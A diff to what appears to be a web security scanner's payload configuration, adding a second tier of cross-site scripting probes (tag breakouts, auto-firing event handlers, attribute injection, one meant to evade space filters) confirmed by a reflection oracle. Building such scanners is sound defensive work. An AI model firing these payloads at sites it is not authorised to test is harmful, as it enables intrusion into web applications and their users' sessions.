@@ -12,6 +12,17 @@ payloads:
   - "'-alert(1)-'"                        # JS string context breakout
   - "<img src=x onerror=alert(1)>"       # event-handler context
   - "javascript:alert(1)"                # href/src sink context
+# Tried only when the planner marks xss a priority (e.g. a client-rendered SPA). More breakout contexts
+# so a reflection that lands inside <script>/<title>/<textarea> or a quoted attribute still executes.
+# The SAME context-aware reflected_xss oracle confirms each (fires only on an *executable* reflection).
+intensive_payloads:
+  - "</script><script>alert(1)</script>"     # break out of an existing inline <script> block
+  - "</title><script>alert(1)</script>"      # break out of <title>
+  - "</textarea><script>alert(1)</script>"   # break out of <textarea>
+  - "<svg/onload=alert(1)>"                   # slash-delimited tag: no space for a space-filter to catch
+  - "<body onload=alert(1)>"                  # body load handler
+  - "<details open ontoggle=alert(1)>"        # auto-firing handler, no script tag
+  - "\" autofocus onfocus=alert(1) x=\""      # attribute-context injection without breaking the tag
 oracle:
   type: any_of
   checks:
